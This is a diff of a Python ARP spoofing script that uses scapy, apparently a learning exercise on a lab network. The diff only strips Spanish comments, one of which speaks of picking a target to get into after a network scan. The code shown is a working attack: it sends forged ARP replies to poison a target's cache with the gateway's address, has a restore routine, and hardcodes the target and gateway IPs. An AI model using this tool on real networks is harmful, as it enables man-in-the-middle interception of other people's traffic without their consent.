@@ -2,8 +2,7 @@
 
 import scapy.all as scapy
 import time
-import sys #LIbreria que nos ayuda a dinaminzar el printeo entre otras funciones
-
+import sys 
 def get_mac(ip):
     arp_request=scapy.ARP(pdst=ip)
 
@@ -20,15 +19,14 @@ def spoof(target_ip,spoof_ip):
     packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
-def restore(destination_ip,source_ip):#Queremos que una vez ejecutemos el arp spoofer luego vuelva a la normalidad
+def restore(destination_ip,source_ip):
     destination_mac=get_mac(destination_ip)
     source_mac= get_mac(source_ip)
     packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
-    scapy.send(packet, count=4, verbose=False) #Lo enviamos y lo hacemos 4 veces para asegurar
+    scapy.send(packet, count=4, verbose=False)
 
-
-target_ip="192.168.58.156"  #UNA VEZ ESCANEADO LA RED Y CONOCIENDO EN QUE MAC&IP QUEREMOS ENTRAR
-gateway_ip="192.168.58.2"    #ES LO ÚNICO QUE SE VA A MODIFICAR YA QUE LO OTRO ESTÁ APARENTEMENTE AUTOMATIZADO
+target_ip="192.168.58.156"  
+gateway_ip="192.168.58.2"   
 
 try:
     numberPackets = 0
